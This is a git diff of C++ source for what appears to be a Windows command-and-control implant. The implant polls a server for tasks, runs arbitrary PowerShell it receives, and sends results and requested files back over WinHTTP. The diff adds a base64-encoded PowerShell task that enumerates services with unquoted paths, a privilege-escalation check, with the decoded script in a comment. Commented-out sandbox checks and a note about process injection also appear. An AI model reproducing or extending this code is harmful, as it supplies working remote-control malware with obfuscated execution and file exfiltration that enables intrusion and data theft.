@@ -11,38 +11,67 @@
 using std::string;
 namespace fs = std::filesystem;
 
-const wchar_t* ACCEPTED_MIME_TYPES[] = {
+const wchar_t *ACCEPTED_MIME_TYPES[] = {
     L"text/plain", L"application/octet-stream", L"text/html",
     L"multipart/form-data", NULL};
 
 int CreateTCPConn();
 bool sendHTTPTaskResult();
 string runPSCommand(string command);
-bool sendRequestedFile(const std::string& filePath);
-bool sendTaskResults(const std::string& data);
+string runEncodedPSCommand(string command);
+bool sendRequestedFile(const std::string &filePath);
+bool sendTaskResults(const std::string &data);
 
 static std::wstring beaconName = L"";
 
-bool runTask(string outBuffer, DWORD dwSize) {
+bool runTask(string outBuffer, DWORD dwSize)
+{
     printf("Running TASK: %.*s\n", dwSize, outBuffer.c_str());
 
     size_t pipePos = outBuffer.find('|');
 
-    if (pipePos == string::npos) return false;
+    if (pipePos == string::npos)
+        return false;
 
     string cmd = outBuffer.substr(0, pipePos);
 
-    if (cmd == "powershell") runPSCommand(outBuffer.substr(pipePos + 1));
+    if (cmd == "powershell")
+        runPSCommand(outBuffer.substr(pipePos + 1));
+    else if (cmd == "enumservices")
+    {
+        string enumCommand{
+            "JABWAHUAbABuAFMAZQByAHYAaQBjAGUAcwAgAD0AIABnAHcAbQBpACAAdwBpAG4AMwAyAF8AcwBlAHIAdgBpAGMAZQAgAHwAIAA/AHsAJABfAH0AIAB8ACAAdwBoAGUAcgBlACAAewAoACQAXwAuAHAAYQB0AGgAbgBhAG0AZQAgAC0AbgBlACAAJABuAHUAbABsACkAIAAtAGEAbgBkACAAKAAkAF8ALgBwAGEAdABoAG4AYQBtAGUALgB0AHIAaQBtACgAKQAgAC0AbgBlACAAIgAiACkAfQAgAHwAIAB3AGgAZQByAGUAIAB7AC0AbgBvAHQAIAAkAF8ALgBwAGEAdABoAG4AYQBtAGUALgBTAHQAYQByAHQAcwBXAGkAdABoACgAIgBgACIAIgApAH0AIAB8ACAAdwBoAGUAcgBlACAAewAoACQAXwAuAHAAYQB0AGgAbgBhAG0AZQAuAFMAdQBiAHMAdAByAGkAbgBnACgAMAAsACAAJABfAC4AcABhAHQAaABuAGEAbQBlAC4ASQBuAGQAZQB4AE8AZgAoACIALgBlAHgAZQAiACkAIAArACAANAApACkAIAAtAG0AYQB0AGMAaAAgACIALgAqACAALgAqACIAfQA7ACAAaQBmACAAKAAkAFYAdQBsAG4AUwBlAHIAdgBpAGMAZQBzACkAIAB7ACAAZgBvAHIAZQBhAGMAaAAgACgAJABzAGUAcgB2AGkAYwBlACAAaQBuACAAJABWAHUAbABuAFMAZQByAHYAaQBjAGUAcwApAHsAIAAkAG8AdQB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEMAbwBsAGwAZQBjAHQAaQBvAG4AcwAuAFMAcABlAGMAaQBhAGwAaQB6AGUAZAAuAE8AcgBkAGUAcgBlAGQARABpAGMAdABpAG8AbgBhAHIAeQA7ACAAJABvAHUAdAAuAGEAZABkACgAIgBTAGUAcgB2AGkAYwBlAE4AYQBtAGUAIgAsACAAJABzAGUAcgB2AGkAYwBlAC4AbgBhAG0AZQApADsAIAAkAG8AdQB0AC4AYQBkAGQAKAAiAFAAYQB0AGgAIgAsACAAJABzAGUAcgB2AGkAYwBlAC4AcABhAHQAaABuAGEAbQBlACkAOwAgACQAbwB1AHQAIAB9ACAAfQA="};
+
+        std::cout
+            << enumCommand;
+        runEncodedPSCommand(enumCommand);
+
+        /*
+        JABWAHUAbABuAFMAZQByAHYAaQBjAGUAcwAgAD0AIABnAHcAbQBpACAAdwBpAG4AMwAyAF8AcwBlAHIAdgBpAGMAZQAgAHwAIAA/AHsAJABfAH0AIAB8ACAAdwBoAGUAcgBlACAAewAoACQAXwAuAHAAYQB0AGgAbgBhAG0AZQAgAC0AbgBlACAAJABuAHUAbABsACkAIAAtAGEAbgBkACAAKAAkAF8ALgBwAGEAdABoAG4AYQBtAGUALgB0AHIAaQBtACgAKQAgAC0AbgBlACAAIgAiACkAfQAgAHwAIAB3AGgAZQByAGUAIAB7AC0AbgBvAHQAIAAkAF8ALgBwAGEAdABoAG4AYQBtAGUALgBTAHQAYQByAHQAcwBXAGkAdABoACgAIgBgACIAIgApAH0AIAB8ACAAdwBoAGUAcgBlACAAewAoACQAXwAuAHAAYQB0AGgAbgBhAG0AZQAuAFMAdQBiAHMAdAByAGkAbgBnACgAMAAsACAAJABfAC4AcABhAHQAaABuAGEAbQBlAC4ASQBuAGQAZQB4AE8AZgAoACIALgBlAHgAZQAiACkAIAArACAANAApACkAIAAtAG0AYQB0AGMAaAAgACIALgAqACAALgAqACIAfQA7ACAAaQBmACAAKAAkAFYAdQBsAG4AUwBlAHIAdgBpAGMAZQBzACkAIAB7ACAAZgBvAHIAZQBhAGMAaAAgACgAJABzAGUAcgB2AGkAYwBlACAAaQBuACAAJABWAHUAbABuAFMAZQByAHYAaQBjAGUAcwApAHsAIAAkAG8AdQB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEMAbwBsAGwAZQBjAHQAaQBvAG4AcwAuAFMAcABlAGMAaQBhAGwAaQB6AGUAZAAuAE8AcgBkAGUAcgBlAGQARABpAGMAdABpAG8AbgBhAHIAeQA7ACAAJABvAHUAdAAuAGEAZABkACgAIgBTAGUAcgB2AGkAYwBlAE4AYQBtAGUAIgAsACAAJABzAGUAcgB2AGkAYwBlAC4AbgBhAG0AZQApADsAIAAkAG8AdQB0AC4AYQBkAGQAKAAiAFAAYQB0AGgAIgAsACAAJABzAGUAcgB2AGkAYwBlAC4AcABhAHQAaABuAGEAbQBlACkAOwAgACQAbwB1AHQAIAB9ACAAfQA=
+
+        $script='$VulnServices = gwmi win32_service | ?{$_} | where
+        {($_.pathname -ne $null) -and ($_.pathname.trim() -ne "")} | where
+        {-not
+        $_.pathname.StartsWith("`"")} | where {($_.pathname.Substring(0,
+        $_.pathname.IndexOf(".exe") + 4)) -match ".* .*"}; if
+        ($VulnServices) { foreach ($service in $VulnServices){ $out =
+        New-Object System.Collections.Specialized.OrderedDictionary;
+        $out.add("ServiceName", $service.name); $out.add("Path",
+        $service.pathname); $out } }';
+        [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($script))*/
+    }
 
     return true;
 }
 
-bool fetchWinHTTPError(const char* msg) {
+bool fetchWinHTTPError(const char *msg)
+{
     std::cout << msg << " failed: " << GetLastError() << "\n";
     return false;
 }
 
-bool fetchTasks(char** outBuffer, DWORD* dwSizeOut) {
+bool fetchTasks(char **outBuffer, DWORD *dwSizeOut)
+{
     // WinHTTP > WinINet
 
     /*WinHttpOpen -> WinHttpConnect (example.com) -> WinHttpOpenRequest   ->
@@ -81,7 +110,8 @@ bool fetchTasks(char** outBuffer, DWORD* dwSizeOut) {
     std::wstring headerString;
     LPCWSTR headerPtr = WINHTTP_NO_ADDITIONAL_HEADERS;
 
-    if (!beaconName.empty()) {
+    if (!beaconName.empty())
+    {
         headerString = L"BeaconName: " + beaconName + L"\r\n";
         headerPtr = headerString.c_str();
     }
@@ -96,22 +126,25 @@ bool fetchTasks(char** outBuffer, DWORD* dwSizeOut) {
         return fetchWinHTTPError("WinHttpReceiveResponse");
 
     // extract the beacon name from the response
-    if (beaconName.empty()) {
+    if (beaconName.empty())
+    {
         DWORD size = 0;
         WinHttpQueryHeaders(hHTTPRequest, WINHTTP_QUERY_CUSTOM, L"BeaconName",
                             WINHTTP_NO_OUTPUT_BUFFER, &size,
                             WINHTTP_NO_HEADER_INDEX);
 
         // If size is 0, the header isn't present.
-        if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
+        if (GetLastError() == ERROR_INSUFFICIENT_BUFFER)
+        {
             std::wstring buffer(size / sizeof(wchar_t),
-                                L'\0');  // allocate correct size
+                                L'\0'); // allocate correct size
 
             if (WinHttpQueryHeaders(hHTTPRequest, WINHTTP_QUERY_CUSTOM,
                                     L"BeaconName", &buffer[0], &size,
-                                    WINHTTP_NO_HEADER_INDEX)) {
+                                    WINHTTP_NO_HEADER_INDEX))
+            {
                 buffer.resize(
-                    (size / sizeof(wchar_t)));  // remove terminating null
+                    (size / sizeof(wchar_t))); // remove terminating null
                 wprintf(L"Header value: %s\n", buffer.c_str());
                 beaconName = buffer;
             }
@@ -120,42 +153,50 @@ bool fetchTasks(char** outBuffer, DWORD* dwSizeOut) {
 
     DWORD dwSize = 0;
 
-    while (true) {
-        if (!WinHttpQueryDataAvailable(hHTTPRequest, &dwSize) || !dwSize) break;
-        char* responseBuf = new char[dwSize + 1];
+    while (true)
+    {
+        if (!WinHttpQueryDataAvailable(hHTTPRequest, &dwSize) || !dwSize)
+            break;
+        char *responseBuf = new char[dwSize + 1];
         ZeroMemory(responseBuf, dwSize + 1);
 
         DWORD dwOut = 0;
 
-        if (!WinHttpReadData(hHTTPRequest, responseBuf, dwSize, &dwOut)) {
+        if (!WinHttpReadData(hHTTPRequest, responseBuf, dwSize, &dwOut))
+        {
             delete[] responseBuf;
             break;
         }
 
         // append chunk to output
-        char* newBuf = new char[*dwSizeOut + dwOut];
+        char *newBuf = new char[*dwSizeOut + dwOut];
 
-        if (*outBuffer != nullptr) {
+        if (*outBuffer != nullptr)
+        {
             memcpy(newBuf, *outBuffer, *dwSizeOut);
             delete[] (*outBuffer);
         }
 
         memcpy(newBuf + *dwSizeOut, responseBuf, dwOut);
-        
+
         *dwSizeOut += dwOut;
         newBuf[*dwSizeOut - 1] = '\0';
         *outBuffer = newBuf;
         delete[] responseBuf;
     }
 
-    if (hHTTPRequest) WinHttpCloseHandle(hHTTPRequest);
-    if (hHTTPConnection) WinHttpCloseHandle(hHTTPConnection);
-    if (hHTTPSession) WinHttpCloseHandle(hHTTPSession);
+    if (hHTTPRequest)
+        WinHttpCloseHandle(hHTTPRequest);
+    if (hHTTPConnection)
+        WinHttpCloseHandle(hHTTPConnection);
+    if (hHTTPSession)
+        WinHttpCloseHandle(hHTTPSession);
 
     return didReceiveResponse;
 }
 
-bool sendRequestedFile(const std::string& filePath) {
+bool sendRequestedFile(const std::string &filePath)
+{
     HINTERNET hHTTPSession = {}, hHTTPConnection = {}, hHTTPRequest = {};
     bool isRequestSuccessful{}, didReceiveResponse{};
 
@@ -184,7 +225,7 @@ bool sendRequestedFile(const std::string& filePath) {
         return fetchWinHTTPError("WinHttpSetOption");
 
     std::uintmax_t fileSize = std::filesystem::file_size(filePath);
-    char* buf = new char[fileSize];
+    char *buf = new char[fileSize];
 
     fs::path fileName = fs::path(filePath).filename();
 
@@ -236,13 +277,17 @@ bool sendRequestedFile(const std::string& filePath) {
 
     DWORD dwSize = 0;
 
-    if (hHTTPRequest) WinHttpCloseHandle(hHTTPRequest);
-    if (hHTTPConnection) WinHttpCloseHandle(hHTTPConnection);
-    if (hHTTPSession) WinHttpCloseHandle(hHTTPSession);
+    if (hHTTPRequest)
+        WinHttpCloseHandle(hHTTPRequest);
+    if (hHTTPConnection)
+        WinHttpCloseHandle(hHTTPConnection);
+    if (hHTTPSession)
+        WinHttpCloseHandle(hHTTPSession);
 
     return didReceiveResponse;
 }
-bool sendTaskResults(const std::string& data) {
+bool sendTaskResults(const std::string &data)
+{
     HINTERNET hHTTPSession = {}, hHTTPConnection = {}, hHTTPRequest = {};
     bool isRequestSuccessful{}, didReceiveResponse{};
 
@@ -285,28 +330,34 @@ bool sendTaskResults(const std::string& data) {
 
     DWORD dwSize = 0;
 
-    if (hHTTPRequest) WinHttpCloseHandle(hHTTPRequest);
-    if (hHTTPConnection) WinHttpCloseHandle(hHTTPConnection);
-    if (hHTTPSession) WinHttpCloseHandle(hHTTPSession);
+    if (hHTTPRequest)
+        WinHttpCloseHandle(hHTTPRequest);
+    if (hHTTPConnection)
+        WinHttpCloseHandle(hHTTPConnection);
+    if (hHTTPSession)
+        WinHttpCloseHandle(hHTTPSession);
 
     return didReceiveResponse;
 }
 
-string runPSCommand(string command) {
+string runEncodedPSCommand(string command)
+{
     char psBuffer[DEFAULT_PS_BUFLEN];
     string res;
 
     string powershellCommand =
-        "powershell -NoProfile -NonInteractive -Command \"" + command + "\"";
+        "powershell -NoProfile -NonInteractive -e \"" + command + "\"";
 
-    FILE* pPipe = _popen(powershellCommand.c_str(), "rt");
+    FILE *pPipe = _popen(powershellCommand.c_str(), "rt");
 
-    if (!pPipe) return "ERROR";
+    if (!pPipe)
+        return "ERROR";
 
-    while (fgets(psBuffer, DEFAULT_PS_BUFLEN, pPipe)) {
+    while (fgets(psBuffer, DEFAULT_PS_BUFLEN, pPipe))
+    {
         res += psBuffer;
-        puts(psBuffer);  // THIS IS THE ONLY WAY TO GET STDOUT FIXME: NOT EVEN
-                         // WHEN I COUT << RESULT
+        puts(psBuffer); // THIS IS THE ONLY WAY TO GET STDOUT FIXME: NOT
+                        // EVEN WHEN I COUT << RESULT
     }
 
     int exitCode = _pclose(pPipe);
@@ -318,7 +369,37 @@ string runPSCommand(string command) {
     // TODO: Make this process injection?
 }
 
-int main(int argc, const char** argv) {
+string runPSCommand(string command)
+{
+    char psBuffer[DEFAULT_PS_BUFLEN];
+    string res;
+
+    string powershellCommand =
+        "powershell -NoProfile -NonInteractive -Command \"" + command + "\"";
+
+    FILE *pPipe = _popen(powershellCommand.c_str(), "rt");
+
+    if (!pPipe)
+        return "ERROR";
+
+    while (fgets(psBuffer, DEFAULT_PS_BUFLEN, pPipe))
+    {
+        res += psBuffer;
+        puts(psBuffer); // THIS IS THE ONLY WAY TO GET STDOUT FIXME: NOT
+                        // EVEN WHEN I COUT << RESULT
+    }
+
+    int exitCode = _pclose(pPipe);
+
+    sendTaskResults(res);
+
+    return res;
+
+    // TODO: Make this process injection?
+}
+
+int main(int argc, const char **argv)
+{
     // Run all checks
     // BOOL cpuOK = checkCPU();
     // BOOL ramOK = checkRAM();
@@ -330,17 +411,20 @@ int main(int argc, const char** argv) {
     //     return 0;
     // }
 
-    std::string testFilename = ".\\file.txt";
-    std::cout << "Uploading: " << testFilename << std::endl;
+    // std::string testFilename = ".\\file.txt";
+    // std::cout << "Uploading: " << testFilename << std::endl;
 
-    //sendRequestedFile(testFilename);
-    char* outBuffer = nullptr;
+    // sendRequestedFile(testFilename);
+    char *outBuffer = nullptr;
     DWORD dwSize = 0;
 
-    while (true) {
-        if (fetchTasks(&outBuffer, &dwSize)) {
+    while (true)
+    {
+        if (fetchTasks(&outBuffer, &dwSize))
+        {
             // TODO: parse tasks and do
-            if (dwSize > 0) {
+            if (dwSize > 0)
+            {
                 runTask(outBuffer, dwSize);
                 // printf("TASK: %.*s\n", dwSize, outBuffer);
                 delete[] outBuffer;
